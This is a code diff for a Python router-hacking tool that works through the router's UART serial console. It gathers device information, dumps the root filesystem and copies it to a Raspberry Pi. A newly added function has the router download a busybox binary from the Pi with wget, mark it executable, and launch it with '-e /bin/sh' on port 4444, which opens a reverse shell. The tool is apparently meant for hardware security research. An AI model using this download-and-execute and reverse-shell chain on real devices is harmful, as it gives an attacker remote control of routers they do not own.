@@ -129,7 +129,7 @@ def check_if_terminal(ser):
     """
         Check if a terminal responds 
     """
-    print(Fore.YELLOW + "\n● Baudrate: " + Fore.WHITE + str(ser.baudrate))
+    print("\n● " + Fore.YELLOW + "Baudrate: " + Fore.WHITE + str(ser.baudrate))
     print("● Checking if there is terminal access:", end = "")
     response = send_command(ser, "echo hola")
     
@@ -141,6 +141,21 @@ def check_if_terminal(ser):
         print(Fore.RED + " ------> No terminal X")
         return False
 
+
+
+def title():
+    print(Fore.MAGENTA + """                                                                       
+8888888b.        888     888       d8888 8888888b. 88888888888 
+888   Y88b       888     888      d88888 888   Y88b    888     
+888    888       888     888     d88P888 888    888    888     
+888   d88P       888     888    d88P 888 888   d88P    888     
+8888888P"        888     888   d88P  888 8888888P"     888     
+888 T88b  888888 888     888  d88P   888 888 T88b      888     
+888  T88b        Y88b. .d88P d8888888888 888  T88b     888     
+888   T88b        "Y88888P" d88P     888 888   T88b    888     
+    """)
+    
+    print(Fore.MAGENTA + "\t\t//////// Router UART Hacking by Carliquiss ////////\n\n")
 
 
 def ducks():
@@ -219,6 +234,18 @@ def check_services(ser):
         services_info["netcat"] = False
         
         
+    wget_info = send_command(ser, "wget")
+    print(wget_info.split())
+    if "Usage:" in wget_info.split():
+        
+        print(Fore.GREEN + "-----> WGET FOUND ✓")
+        services_info["wget"] = True
+    
+    else:
+        print(Fore.RED + "-----> NO WGET FOUND X")
+        services_info["wget"] = False
+        
+        
     
     lighttpd_info = send_command(ser, "ls /etc/lighttpd/lighttpd2.conf")
     
@@ -259,7 +286,7 @@ def get_info(ser):
 
 def extract_rootfs(ser):
     
-    print("\n●Extracting rootfs partition to /tmp/rootfs.bin.... ", end = "")
+    print("\n● Extracting rootfs partition to /tmp/rootfs.bin.... ", end = "")
     
     try:    
         if "/tmp/rootfs.bin" in send_command(ser, "ls /tmp/rootfs.bin").split("\n"):
@@ -305,17 +332,20 @@ def mod_lighttpd(ser):
         print(Fore.RED + "Some errors during the process of trying to mount /tmp")
             
 
-def push_netcat(ser):
+def copy_busybox(ser):
     
     network_status, rpi_ip = check_networking(ser)
     try:
-        copyfile("./binaries/netcat_mipsel", "/var/www/html/netcat_mipsel")
+        copyfile("./binaries/busybox-mipsel", "/var/www/html/busybox_mipsel")
         
         if check_web_server() and network_status:
-            send_command(ser, "wget -O /tmp/netcat_el http://{}/netcat_mipsel".format(rpi_ip))
-    
+            
+            send_command(ser, "wget -O /tmp/busybox_el http://{}/busybox_mipsel".format(rpi_ip))
+            send_command(ser, "chmod +x /tmp/busybox_el")
+            send_command(ser, "/tmp/busybox_el {} 4444 -e /bin/sh &".format(rpi_ip))
+            
     except Exception as error:
-        print(Fore.RED + "Error pushing netcat file")
+        print(Fore.RED + "Error pushing busybox file, error -> ")
         print(error)
 
 
@@ -332,27 +362,24 @@ def check_networking(ser):
     print("+--------------------------------+")
     
     if raspberry_ip.rsplit(".")[0] == device_ip.rsplit(".")[0]:
+        print(Fore.GREEN + " ------> Raspberry and Device on the same network ✓\n")
         return True, raspberry_ip
     
     else:
+        print(Fore.RED + "▬ The device and the Raspberry Pi are not in the same network, please connect the Rasperry to the router")
         return False, raspberry_ip
 
 
 def scp_to_raspi(ser):
     
-    if_same_network, raspberry_ip = check_networking(ser)
+    same_network, raspberry_ip = check_networking(ser)
     
-    if if_same_network:
-        print(Fore.GREEN + " ------> Raspberry and Device on the same network ✓\n")
+    if same_network:
         print("\n● Copying rootfs.bin to raspberry /home/pi/rootfs.bin, it can take a while (up to 3-4 min). Please wait...")
         
         send_command(ser, "scp /tmp/rootfs.bin pi@{}:/home/pi/rootfs.bin".format(raspberry_ip))
         send_command(ser, "y")
         send_command(ser, RASPBERRYPI_PASSWORD + "\n")
-
-    
-    else:
-        print(Fore.RED + "▬ The device and the Raspberry Pi are not in the same network, please connect the Rasperry to the router")
     
 
 
@@ -380,28 +407,21 @@ def check_web_server():
 
 
 def test_mode():
-    
-    check_web_server()
-    
+        
     try:
         baudrate = 57600    
         ser = serial.Serial ("/dev/ttyS0", baudrate)
         
         if check_if_terminal(ser):
             
-            servicios = check_services(ser)
-            
             print_info(get_info(ser))
-            print_info(servicios)
+            servicios = check_services(ser)
             
             extract_rootfs(ser) 
             
-            if servicios["scp"]:
+            if not servicios["netcat"]:
                 #scp_to_raspi(ser)
                 pass
-            
-            if not servicios["netcat"]:
-                push_netcat(ser)
         
             get_terminal(ser)
             ducks()
@@ -416,7 +436,6 @@ def direct_terminal_mode():
     
     try: 
         baudrate = sys.argv[2]
-        print(Fore.GREEN + "Baudrate: " + baudrate)
         
         ser = serial.Serial ("/dev/ttyS0", baudrate)
             
@@ -440,15 +459,13 @@ def auto_mode():
     if baudrate != 0:         
             
             
-        print("\n● Please wait 30 seconds just to be sure the device is fully booted")
-        sleep(30)
+        print("\n● Please wait 40 seconds just to be sure the device is fully booted")
+        sleep(40)
             
         if check_if_terminal(ser):
-                        
-            servicios = check_services(ser)
-            
+
             print_info(get_info(ser))
-            print_info(servicios)
+            servicios = check_services(ser)
             
             extract_rootfs(ser)
             
@@ -470,6 +487,7 @@ def auto_mode():
 
 def main():
     
+    title()
     if len(sys.argv) >= 2:
         
         if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
